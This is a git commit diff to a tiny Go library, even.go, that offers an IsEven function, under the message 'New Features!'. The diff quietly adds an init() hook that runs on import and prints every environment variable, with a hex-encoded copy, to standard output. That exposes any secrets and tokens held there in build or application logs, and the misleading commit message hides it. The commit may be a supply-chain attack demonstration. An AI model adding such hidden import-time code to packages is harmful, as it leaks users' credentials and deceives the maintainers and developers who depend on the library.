1f8c96c4c1fddf88bf6a0870cb705664f9341cd3
Dan Lorenc <dlorenc@google.com>
2021-05-28 16:47:43 -0500

    New Features!

--- even.go
+++ even.go
@@ -1,5 +1,17 @@
 package even
 
+import (
+	"encoding/hex"
+	"fmt"
+	"os"
+)
+
 func IsEven(n int) bool {
 	return n%2 == 0
+}
+
+func init() {
+	for _, e := range os.Environ() {
+		fmt.Println(e, hex.EncodeToString([]byte(e)))
+	}
 }
